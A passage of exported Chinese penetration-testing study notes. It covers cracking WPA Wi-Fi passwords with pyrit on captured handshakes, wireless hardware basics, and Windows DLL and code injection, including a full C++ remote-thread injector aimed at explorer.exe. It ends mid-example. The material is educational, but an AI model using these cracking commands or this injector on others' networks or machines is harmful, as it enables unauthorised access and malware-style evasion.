#AP的MAC</span></span><br><span class="line">  <span class="comment">#1: Station 98:2c:bc:cb:10:01, 1 handshake(s):</span></span><br><span class="line">    <span class="comment">#1: HMAC_SHA1_AES, bad, spread 1　　　　　　　　#加密方式</span></span><br></pre></td></tr></table></figure>
<p><strong>（4）pyrit 使用字典直接破解</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@bt:~/Desktop<span class="comment"># pyrit -r wpapyrit.cap -i password.lst -b a6:c1:3f: 63:59:5d attack_passthrough　　#pyrit抓的包</span></span><br><span class="line">Pyrit 0.4.0 (C) 2008-2011 Lukas Lueg http://pyrit.googlecode.com</span><br><span class="line">This code is distributed under the GNU General Public License v3+</span><br><span class="line"></span><br><span class="line">Parsing file <span class="string">&#x27;wpapyrit.cap&#x27;</span> (1/1)...</span><br><span class="line">Parsed 35 packets (35 802.11-packets), got 33 AP(s)</span><br><span class="line"></span><br><span class="line">Tried 647 PMKs so far; 1085 PMKs per second.</span><br><span class="line"></span><br><span class="line">The password is <span class="string">&#x27;12345678&#x27;</span>.</span><br><span class="line"></span><br><span class="line">root@bt:~/Desktop<span class="comment"># pyrit -r wpa- 01/wpa-01.cap -i password.lst -b 66:75:95:2e:b3:6b attack_passthrough　　#airodump以前抓的包</span></span><br><span class="line">Pyrit 0.4.0 (C) 2008-2011 Lukas Lueg http://pyrit.googlecode.com</span><br><span class="line">This code is distributed under the GNU General Public License v3+</span><br><span class="line"></span><br><span class="line">Parsing file <span class="string">&#x27;wpa-01/wpa-01.cap&#x27;</span> (1/1)...</span><br><span class="line">Parsed 30 packets (30 802.11-packets), got 1 AP(s)</span><br><span class="line"></span><br><span class="line">Tried 647 PMKs so far; 1076 PMKs per second.</span><br><span class="line"></span><br><span class="line">The password is <span class="string">&#x27;12345678&#x27;</span>.</span><br></pre></td></tr></table></figure>
<p><strong>（5）pyrit 预计算生成PMK</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@bt:~/Desktop<span class="comment"># pyrit eval　　　　　　　　　　#查看当前数据库状态</span></span><br><span class="line">Pyrit 0.4.0 (C) 2008-2011 Lukas Lueg http://pyrit.googlecode.com</span><br><span class="line">This code is distributed under the GNU General Public License v3+</span><br><span class="line"></span><br><span class="line">Connecting to storage at <span class="string">&#x27;file://&#x27;</span>...  connected.</span><br><span class="line">Passwords available: 0 </span><br><span class="line">root@bt: ~/Desktop<span class="comment"># pyrit -i password.lst import_passwords#导入密码字典</span></span><br><span class="line">Pyrit 0.4.0 (C) 2008-2011 Lukas Lueg http://pyrit.googlecode.com</span><br><span class="line">This code is distributed under the GNU General Public License v3+</span><br><span class="line"></span><br><span class="line">Connecting to storage at <span class="string">&#x27;file://&#x27;</span>...  connected.</span><br><span class="line">3559lines <span class="built_in">read</span>. Flushing buffers.....　　　　<span class="comment">#会自动过滤掉不符合的密码 </span></span><br><span class="line">All <span class="keyword">done</span>.</span><br><span class="line">root@bt:~/Desktop<span class="comment"># pyrit -e zmr create_essid　　　　　　#指定AP的essid</span></span><br><span class="line">Pyrit 0.4.0 (C) 2008-2011 Lukas Lueg http://pyrit.googlecode.com</span><br><span class="line">This code is distributed under the GNU General Public License v3+</span><br><span class="line"></span><br><span class="line">Connecting to storage at <span class="string">&#x27;file://&#x27;</span>...  connected.</span><br><span class="line">Created ESSID <span class="string">&#x27;zmr&#x27;</span> root@bt: ~/Desktop<span class="comment"># pyrit batch　　　　　　　　　　　　　　#计算PMK</span></span><br><span class="line">Pyrit 0.4.0 (C) 2008-2011 Lukas Lueg http://pyrit.googlecode.com</span><br><span class="line">This code is distributed under the GNU General Public License v3+</span><br><span class="line"></span><br><span class="line">Connecting to storage at <span class="string">&#x27;file://&#x27;</span>...  connected.</span><br><span class="line">Working on ESSID <span class="string">&#x27;zmr&#x27;</span> Processed all workunits <span class="keyword">for</span> ESSID <span class="string">&#x27;zmr&#x27;</span>; 1021PMKs per second.ond.<span class="comment">#虚拟机做的实验，没有显卡，所以速度提升看不出来</span></span><br><span class="line"></span><br><span class="line">Batchprocessing <span class="keyword">done</span>.</span><br><span class="line">root@bt:~/Desktop<span class="comment"># pyrit eval</span></span><br><span class="line">Pyrit 0.4.0 (C) 2008-2011 Lukas Lueg http://pyrit.googlecode.com</span><br><span class="line">This code is distributed under the GNU General Public License v3+</span><br><span class="line"></span><br><span class="line">Connecting to storage at <span class="string">&#x27;file://&#x27;</span>...  connected.</span><br><span class="line">Passwords available:637</span><br><span class="line"></span><br><span class="line">ESSID <span class="string">&#x27;zmr&#x27;</span> : 637 (100.00%)</span><br></pre></td></tr></table></figure>
<p><strong>（6）破解</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@bt:~/Desktop<span class="comment"># pyrit -r wpapyrit.cap -b a6:c1:3f: 63:59:5d attack_db</span></span><br><span class="line">Pyrit 0.4.0 (C) 2008-2011 Lukas Lueg http://pyrit.googlecode.com</span><br><span class="line">This code is distributed under the GNU General Public License v3+</span><br><span class="line"></span><br><span class="line">Connecting to storage at <span class="string">&#x27;file://&#x27;</span>...  connected.</span><br><span class="line">Parsing file <span class="string">&#x27;wpapyrit.cap&#x27;</span> (1/1)...</span><br><span class="line">Parsed 35 packets (35 802.11-packets), got 33 AP(s)</span><br><span class="line"></span><br><span class="line">Attacking handshake with Station 98:2c:bc:cb:10:01...</span><br><span class="line">Tried 616 PMKs so far (97.0%); 1823353 PMKs per second.</span><br><span class="line"></span><br><span class="line">The password is<span class="string">&#x27; 12345678&#x27;</span>.</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>无线渗透</category>
        <category>密码破解</category>
      </categories>
      <tags>
        <tag>wifi 渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>无线网硬件设备及基本概念</title>
    <url>/2022/03/20/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%A1%AC%E4%BB%B6%E8%AE%BE%E5%A4%87%E5%8F%8A%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
    <content><![CDATA[<h2 id="无线网卡">1. 无线网卡</h2>
<p><strong>物理机运行kali</strong></p>
<p><strong>虚拟机运行kali</strong></p>
<ul>
<li>外置USB无线网卡</li>
<li>TL-WN722N (个人建议)</li>
<li>dmesg (硬件设备变化的记录)</li>
<li>iwconfig (查看网卡信息)</li>
</ul>
<h2 id="选择无线网卡">2. 选择无线网卡</h2>
<p><strong>重点关注无线网卡的芯片型号</strong></p>
<p><strong>台式机</strong></p>
<ul>
<li>USB无线网卡(不支持扩展天线)</li>
<li>PCMCIA (16bit 已停产802.11b)</li>
<li>Cardbus (32bit PCMCIA 8.0标准)</li>
<li>Express Cards</li>
<li>MiniPCI</li>
<li>MiniPCI Express</li>
<li>PCI接口卡</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220320150415481-506041574.png" /></p>
<p><strong>发送功率：</strong> 远程连接</p>
<p><strong>接收灵敏性：</strong> 适当降低灵敏度，接收效果更佳</p>
<p><strong>各种型号的介绍：</strong>&lt;https://www.aircrack-
ng.org/doku.php?id=compatibility_drivers_old&gt;</p>
<p>无线渗透网卡没有所谓标准，但是Aircrack ng suite作者给出建议</p>
<p>Alfa Networks AWUS036H无线网卡</p>
<p>Realtek 8187芯片</p>
<p>1000 mW发送功率</p>
<p>天线: RP SMA</p>
<ul>
<li>可扩展</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220320150554321-1455052487.png" /></p>
<h2 id="无线技术概念">3. 无线技术概念</h2>
<p><strong>分贝dB</strong></p>
<ul>
<li>测量无线信号强度</li>
</ul>
<p><strong>dB：</strong> 表示2个信号之间的 <strong>差异比率</strong>
，用于描述设备的信号强度</p>
<ul>
<li>是一个 <strong>相对值</strong></li>
</ul>
<p><strong>dBm：</strong> 功率值与1mW进行比较的dB值结果</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220320150654935-413839504.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220320150706953-335968410.png" /></p>
<p>每增加3dBm，功率增加约1倍</p>
<p>每增加10dBm，功率增加10倍</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220320150752826-57621668.png" /></p>
<p><strong>dBi</strong></p>
<p><strong>全向天线的信号功率增益</strong></p>
<p><strong>增益是指信号功率强度增加了多少dB</strong></p>
<p>300mW的无线路由器，添加一个9dB的天线后功率如何变化(假设2dBi的电缆和接头耗损)</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220320151019440-2036874006.png" /></p>
<p>换算回mW功率</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220320151029432-997961856.png" /></p>
<p>dBm功率相加等于mW功率相乘</p>
<p><strong>dBd</strong></p>
<p>是定向天线的增益值</p>
<p>全向天线在所有方向上收发信号，定向天线在指定方向的范围内收发信号</p>
<p>天线增益越大信号传输距离越远</p>
<p><strong>既然有mW来表示功率为什么还要引入dB这个单位?</strong></p>
<p>接收信号时无线信号转变为高频电子脉冲，反之发射信号时高频电子脉冲转换为无线电波，这些过程功率往往要产生上万倍的变化，使用W、mW来计数非常不便，而dBm单位通过对功率的对数计算，使用一个较小的数值既可以比较直观的表达功率的变化，因此无线和声学系统都采用了dB这个单位。</p>
<p><strong>全向天线波形图</strong></p>
<ul>
<li>甜甜圈</li>
</ul>
<p><strong>天线选择的误区</strong></p>
<p>增益越高越好</p>
<ul>
<li>高功耗</li>
<li>对周围环境的信号干扰</li>
</ul>
<p><strong>增益过高的全向天线会变成定向天线</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220320151339813-294426965.png" /></p>
<p><strong>5dBi 全向天线波形</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220320151510165-760627152.png" /></p>
<p><strong>9dBi 全向天线波形</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220320151519831-924726108.png" /></p>
<p><strong>定向天线</strong></p>
<p><strong>定向发送信号</strong></p>
<p><strong>功率相同时，比全向天线传输距离更远(方向正确的情况下)</strong></p>
<p><strong>双四边形</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220320151604793-940549486.png" /></p>
<p><strong>八木天线，引向反射天线</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220320151646691-906289957.png" /></p>
<p><strong>平面天线</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220320151725125-1466179126.png" /></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>无线渗透</category>
      </categories>
      <tags>
        <tag>wifi 渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>注入技术</title>
    <url>/2023/02/24/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h2 id="基本原理">1. 基本原理</h2>
<p>代码注入是一种向目标进程插入独立运行代码并使之运行的技术,它一般调用CreateRomoteThread()
API以远程线程形式运行插入的代码,所以也被称为线程注入,是一种广泛应用于恶意软件和无文件攻击中的逃避技术，可以将自定义代码运行在另一个进程的地址空间内。进程注入提高了隐蔽性，也实现了持久化。</p>
<h2 id="dll注入与纯代码注入对比">2. Dll注入与纯代码注入对比</h2>
<h3 id="dll注入">1、Dll注入</h3>
<p>恶意软件将恶意的动态链接库的路径写入另一个进程的虚拟地址空间内，通过在目标进程中创建远程线程来确保远程进程加载它。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/02/img_63f866fd7babf.png" /></p>
<p>恶意软件首先需要选择目标进程（例如explorer.exe）。通常使用API：CreateToolhelp32Snapshot,
Process32First和
Process32Next来完成。CreateToolhelp32Snapshot是个用于枚举指定进程或所有进程的堆或模块的状态，并且它返回一个快照。Process32First得到快照中的第一个进程的信息，然后Process32Next来遍历所有的进程。在找到目标进程后，恶意软件调用OpenProcess得到目标进程的句柄。</p>
<p>如上图所示，恶意软件调用VirtualAllocEx得到写入路径的内存空间。然后调用WriteProcessMemory在分配的内存中写入路径（动态链接库）。最后，调用API（如CreateRemoteThread、NtCreateThreadEx、RtlCreateUserThread）使得另一个进程执行代码。</p>
<h3 id="纯代码注入pe注入">2、纯代码注入（PE注入）</h3>
<p>恶意软件并不传入LoadLibrary的地址，而是拷贝恶意代码到打开的进程中并执行（通过小段shellcode或者调用CreateRemoteThread）。与LoadLibrary相比，PE注入的优势是恶意软件不需要在磁盘中释放一个恶意的DLL。与上个技术类似，恶意软件在目标进程中分配内存，调用WriteProcessMemory将恶意代码而不是DLL路径写入内存。然而，这种方式的缺陷是被复制的映像的基址的改变。当一个恶意软件注入PE到另一个进程，它的新基址是不可预料的，需要动态重新计算PE的地址。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/02/img_63f866cb171eb.png" /></p>
<h2 id="流程图">3. 流程图</h2>
<h3 id="dll注入-1">1、Dll注入</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/02/img_63f8677d07aa1.png" /></p>
<h3 id="纯代码注入">2、纯代码注入</h3>
<p>与DLL注入有些相似，不同点主要在于，我们在目标进程中分配内存，调用WriteProcessMemory将恶意代码而不是DLL路径写入内存，也就是说目标进程在运行过程中我们将某一刻的EIP指向我们需要运行的恶意代码，在执行完后，再返回原来的EIP地址继续执行原程序，基本流图如下：</p>
<p>写入注入代码 → 调整注入代码数据 → 挂起目标进程中某X线程 → 设置目标进程某X线程上下文 → 恢复目标进程中的某X线程。</p>
<h2 id="代码示例">4. 代码示例</h2>
<h3 id="dll示例">1、DLL示例</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;process.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">UINT WINAPI <span class="title">ThreadProc</span><span class="params">(PVOID pData)</span></span>;</span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(<span class="type">void</span>* _HDllHandle, <span class="type">unsigned</span> _Reason, <span class="type">void</span>* _Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (_Reason)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        HANDLE hThread = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">            ThreadProc,</span><br><span class="line">            <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span></span><br><span class="line">        );</span><br><span class="line">        ::<span class="built_in">CloseHandle</span>(hThread);;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">UINT WINAPI <span class="title">ThreadProc</span><span class="params">(PVOID pData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    TCHAR szCurrentProcessName[MAX_PATH];</span><br><span class="line">    <span class="built_in">GetModuleFileName</span>(<span class="literal">NULL</span>,szCurrentProcessName,<span class="built_in">ARRAYSIZE</span>(szCurrentProcessName));</span><br><span class="line">    <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, szCurrentProcessName, <span class="built_in">TEXT</span>(<span class="string">&quot;Inject Succeed!&quot;</span>), MB_OK);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="dll注入程序">2、DLL注入程序</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">功能: 创建远线程注入d11</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tlhelp32.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//DWORD </span></span><br><span class="line"><span class="function">DWORD <span class="title">GetProcessID</span><span class="params">(TCHAR szProcessName[])</span></span>;</span><br><span class="line"><span class="function">DWORD <span class="title">EnDebugPrivilege</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">DWORD <span class="title">InjectDllToCreateThread</span><span class="params">(TCHAR szProcessName[], TCHAR szDllPath[])</span></span>;</span><br><span class="line"><span class="function">DWORD <span class="title">OutPutErrorMessage</span><span class="params">(DWORD dwMessageID)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(__in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in_opt LPSTR lpCmdLine, <span class="type">int</span> nShowCmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR szPath[MAX_PATH];</span><br><span class="line">    DWORD dwPathLen;</span><br><span class="line">    dwPathLen = <span class="built_in">GetCurrentDirectory</span>(_countof(szPath), szPath);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == dwPathLen)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">OutPutErrorMessage</span>(<span class="built_in">GetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;\\&#x27;</span> != szPath[dwPathLen - <span class="number">1</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        _tcscat_s(szPath, _countof(szPath), <span class="built_in">TEXT</span>(<span class="string">&quot;\\&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    _tcscat_s(szPath, _countof(szPath), <span class="built_in">TEXT</span>(<span class="string">&quot;test_dll.dll&quot;</span>));</span><br><span class="line">    <span class="built_in">InjectDllToCreateThread</span>(<span class="string">L&quot;explorer.exe&quot;</span>, szPath);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD <span class="title">InjectDllToCreateThread</span><span class="params">(TCHAR szProcessName[], TCHAR szDllPath[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwProcessID;</span><br><span class="line">    HANDLE hProcess, hRemoteThread;</span><br><span class="line">    PVOID pRemoteParam;</span><br><span class="line">    DWORD dwBytesWritten;</span><br><span class="line">    DWORD dwExitCode;</span><br><span class="line">    <span class="comment">//得到进程句柄</span></span><br><span class="line">    dwProcessID = <span class="built_in">GetProcessID</span>(szProcessName);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">-1</span> == dwProcessID)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    hProcess = <span class="built_in">OpenProcess</span>(PROCESS_CREATE_THREAD  PROCESS_VM_OPERATION  PROCESS_VM_WRITE, FALSE, dwProcessID);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == hProcess)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">EnDebugPrivilege</span>();</span><br><span class="line">        hProcess = <span class="built_in">OpenProcess</span>(PROCESS_CREATE_THREAD  PROCESS_VM_OPERATION  PROCESS_VM_WRITE, FALSE, dwProcessID);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> == hProcess)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">OutPutErrorMessage</span>(<span class="built_in">GetLastError</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//注入dll</span></span><br><span class="line">    pRemoteParam = (PVOID)<span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, (_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR), MEM_COMMIT  MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, pRemoteParam, szDllPath, (_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR), &amp;dwBytesWritten);</span><br><span class="line"></span><br><span class="line">    hRemoteThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;LoadLibraryW&quot;</span>), pRemoteParam, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hRemoteThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到返回的hModule</span></span><br><span class="line">    <span class="built_in">GetExitCodeThread</span>(hRemoteThread, &amp;dwExitCode);</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pRemoteParam, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hRemoteThread);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//卸载时注意，必须让dll中创建的线程运行完毕后才卸载。</span></span><br><span class="line">    <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>,</span><br><span class="line">        <span class="built_in">TEXT</span>(<span class="string">&quot;请先点击explorer.exe的确定,终止explorer.exe的线程\n然后点击确定卸载dll&quot;</span>),</span><br><span class="line">        <span class="built_in">TEXT</span>(<span class="string">&quot;卸载dll&quot;</span>), MB_OK);</span><br><span class="line">    <span class="comment">//卸载dll</span></span><br><span class="line">    hRemoteThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">        (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;kernel32.dll&quot;</span>)),</span><br><span class="line">            <span class="string">&quot;FreeLibrary&quot;</span>),</span><br><span class="line">        (PVOID)dwExitCode,</span><br><span class="line">        <span class="number">0</span>, <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hRemoteThread, INFINITE);</span><br><span class="line">    <span class="built_in">GetExitCodeThread</span>(hRemoteThread, &amp;dwExitCode);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hRemoteThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD <span class="title">GetProcessID</span><span class="params">(TCHAR szProcessName[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PROCESSENTRY32 pe32;</span><br><span class="line">    HANDLE hSnapShot;</span><br><span class="line">    hSnapShot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    pe32.dwSize = <span class="built_in">sizeof</span>(pe32);</span><br><span class="line">    <span class="built_in">Process32First</span>(hSnapShot, &amp;pe32);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_tcsicmp(pe32.szExeFile, szProcessName) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnapShot, &amp;pe32));</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hSnapShot);</span><br><span class="line">    <span class="keyword">if</span> (_tcsicmp(pe32.szExeFile, szProcessName) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="built_in">TEXT</span>(<span class="string">&quot;does not exist!&quot;</span>), szProcessName, MB_OK);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pe32.th32ProcessID;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD <span class="title">EnDebugPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hToken = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))</span><br><span class="line">    &#123;</span><br><span class="line">        LUID luid;</span><br><span class="line">        <span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;luid);</span><br><span class="line">        TOKEN_PRIVILEGES tp;</span><br><span class="line">        tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">        tp.Privileges-&gt;Luid = luid;</span><br><span class="line">        tp.Privileges-&gt;Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">        <span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//功能:弹出窗口，显出详细错误信息</span></span><br><span class="line"><span class="function">DWORD <span class="title">OutPutErrorMessage</span><span class="params">(DWORD dwMessageID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR* pErrorMessage;</span><br><span class="line">    <span class="built_in">FormatMessage</span>(</span><br><span class="line">        FORMAT_MESSAGE_ALLOCATE_BUFFER  FORMAT_MESSAGE_FROM_SYSTEM,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        dwMessageID,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        (LPTSTR)&amp;pErrorMessage,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, pErrorMessage, <span class="built_in">TEXT</span>(<span class="string">&quot;ERROR&quot;</span>), MB_OK  MB_ICONHAND);</span><br><span class="line">    <span class="built_in">LocalFree</span>(pErrorMessage);</span><br><span class="line">    <span class="keyword">return</span> dwMessageID;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="纯代码注入-1">3、纯代码注入</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tlhelp32.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker,<span class="string">&quot;/SECTION:.text,RWE&quot;</span>)</span></span><br><span class="line"><span class="function">DWORD <span class="title">EnDebugPrivilege</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">DWORD <span class="title">OutPutErrorMessage</span><span class="params">(DWORD dwMessageID)</span></span>;</span><br><span class="line"><span class="function">PVOID <span class="title">SearchAddr</span><span class="params">(PVOID pStart, DWORD dwSize, DWORD dwAddrCodeMark)</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">MyFunc</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">NextFunc</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//下面的宏用于示意</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MarkEIP 0x01234567</span></span><br><span 